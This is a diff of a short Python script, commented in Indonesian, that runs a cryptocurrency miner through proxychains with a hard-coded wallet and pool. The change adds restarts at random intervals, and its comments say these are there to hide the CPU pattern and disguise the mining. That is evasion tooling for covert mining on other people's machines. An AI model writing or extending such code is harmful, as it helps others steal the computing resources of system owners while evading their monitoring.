@@ -1,25 +1,28 @@
 #!/usr/bin/env python3
-import subprocess, time, os, signal, psutil
+import subprocess, time, os, signal, random
 
 WALLET = "scash1qssvy8a0lrueh25j2rkzuv2lmsalgaemc6szj52.Danis"
 POOL = "stratum+tcp://satoshicash.cedric-crispin.com:4474"
-PROXY = ["proxychains"]  # Kosongkan [] jika tanpa proxy
+PROXY = ["proxychains"]  # Kosongkan [] jika tidak pakai proxy
 
 def start_miner():
     cmd = PROXY + ["./minerd", "-a", "randomx", "-o", POOL, "-u", WALLET, "-p", "x"]
     return subprocess.Popen(cmd)
 
 while True:
-    p = start_miner()
+    print("[*] Menjalankan miner...")
+    miner = start_miner()
+
     try:
         while True:
-            cpu = psutil.cpu_percent(interval=5)
-            if cpu > 90:
-                print("[!] CPU tinggi, restart miner...")
-                p.terminate()
-                time.sleep(5)
-                break
+            time.sleep(random.randint(300, 600))  # jalan 5–10 menit random
+            # Auto restart miner untuk sembunyikan pola CPU
+            print("[*] Restart miner untuk penyamaran...")
+            miner.terminate()
+            miner.wait()
+            break
     except Exception as e:
         print("Error:", e)
-        p.terminate()
-        time.sleep(5)
+        miner.terminate()
+        miner.wait()
+        time.sleep(10)
